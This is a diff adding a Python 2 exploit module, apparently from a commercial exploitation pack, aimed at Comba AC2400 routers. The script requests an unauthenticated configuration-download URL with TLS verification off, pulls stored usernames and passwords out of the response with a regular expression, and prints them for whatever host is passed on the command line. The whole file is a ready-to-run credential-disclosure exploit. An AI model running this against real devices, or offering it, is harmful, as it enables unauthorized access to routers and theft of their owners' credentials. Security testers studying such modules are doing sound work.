@@ -1,0 +1,45 @@
+#! /usr/bin/env python2
+ 
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2019
+#
+
+###
+# STD modules
+###
+import os, sys, re
+import requests
+
+_name_   = 'd2sec_comba_1'
+_vendor_ = 'comba'
+_model_  = ['AC2400']
+_vuln_   = 'Credentials Disclosure Vulnerability'
+_cve_    = ''
+_ref_    = 'https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/multiple-vulnerabilities-in-comba-and-d-link-routers/'
+_port_   = 443
+
+def pwnrouter(host,port=_port_):
+  try:
+    url = "https://%s:%s/09/business/upgrade/upcfgAction.php?download=true" % (host,port)
+    response = requests.get(url, verify=False)
+  except Exception, e:
+    print '[-] error : %s' % e
+    return
+  if response is None:
+    print '[+] %s not vulnerable' % host
+    
+  m = re.findall('#\*\*#([^#]+)#\*\*#([^#]+)#\*\*#[\dabcdef]+#\*\*#\d+#\*\*#\d+#\*\*#\d+#\*\*#\d+#\*\*#[\d\-]+#\*\*#[\d\-]+', response.text)
+  if m is None:
+    print '[+] %s not vulnerable' % host
+    print response.text.encode('utf-8')
+  else:
+    print '[+] %s vulnerable' % host
+    for usr in m:
+        print('Username: %s\nPassword: %s\n'%(usr[0],usr[1]))
+    print response.text.encode('utf-8')        
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1], int(sys.argv[2]))
